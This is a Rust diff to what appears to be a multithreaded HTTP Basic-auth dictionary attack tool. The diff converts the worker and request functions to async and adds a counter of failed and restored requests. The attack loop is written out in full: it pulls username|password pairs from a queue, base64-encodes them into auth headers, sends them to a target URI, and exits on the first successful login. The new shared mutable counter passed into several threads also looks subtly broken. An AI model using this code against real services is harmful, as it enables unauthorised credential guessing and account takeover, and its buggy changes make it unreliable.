@@ -3,6 +3,7 @@ use crossbeam_channel::Receiver;
 const MAX_NMUM_THREADS: &str = "MAX_NUM_THREADS";
 const CHANNEL_BUFFER: &str = "CHANNEL_BUFFER";
 const CHANNEL_BUFFER_DEF_VALUE: usize = 10000000;
+use async_std::task;
 
 use super::{
     connection::{http_req, BruteResponse},
@@ -36,22 +37,25 @@ fn run_attack(parsed_command: HashMap<String, String>, original_command: &str) {
 
     let dictionary_attack = check_username_and_passwords;
 
+    
     rayon::scope(|s| {
+        let mut failed_and_restored_requests = 0;
         let (work_queue_sender, work_queue_receiver) = crossbeam_channel::bounded(channel_buffer);
         println!("I will use [ {} ] threads", num_threads);
         for task_counter in 0..num_threads {
             let work_receiver: Receiver<String> = work_queue_receiver.clone();
 
-            s.spawn(move |_| {
-                do_job(
+            s.spawn(move |_|  {
+                task::block_on(   do_job(
                     task_counter,
                     num_threads,
                     uri.as_str(),
                     &start,
                     work_receiver,
                     original_command,
-                );
-            });
+                    &mut failed_and_restored_requests 
+                ));
+         });
         }
 
         let filename_passwords = parsed_command.get("dictionary").unwrap();
@@ -124,15 +128,17 @@ fn load_env_variable_as_usize(
     }
 }
 
-fn do_job(
+ async fn do_job(
     task_counter: usize,
     num_threads: usize,
     uri: &str,
     start: &Instant,
     work_receiver: Receiver<String>,
     original_command: &str,
+    failed_and_restored_requests: &mut i32
 ) {
     println!("thread {} initialized", &task_counter);
+
     loop {
         let tx_res = work_receiver.recv();
 
@@ -141,12 +147,13 @@ fn do_job(
                 let separator_pos = tx.chars().position(|c| c == '|').unwrap();
                 let username = &tx[0..separator_pos];
                 let password = &tx[separator_pos + 1..];
-                match attack_request(task_counter, &uri, username, password) {
+                match task::block_on(attack_request(task_counter, &uri, username, password, failed_and_restored_requests)) {
                     Ok(_) => {
                         let duration = start.elapsed();
                         println!("original command: {:?}", original_command);
                         println!("duration: {:?}", duration);
                         println!("total n. of threads: {:?}", num_threads);
+                        println!("failed and restored requests: {:?}", failed_and_restored_requests);
                         println!("===============================");
                         process::exit(0x0000);
                     }
@@ -161,14 +168,15 @@ fn do_job(
     }
 }
 
-fn attack_request(
+async fn attack_request(
     idx: usize,
     uri: &str,
     username: &str,
     password: &str,
+    failed_and_restored_requests: &mut i32
 ) -> Result<BruteResponse, String> {
     let auth = base64::encode(format!("{}:{}", &username, &password));
-    let status = http_req(uri, &auth, username, &password);
+    let status = http_req(uri, &auth, username, &password, failed_and_restored_requests).await;
 
     if status.is_ok() {
         let result = status.unwrap();
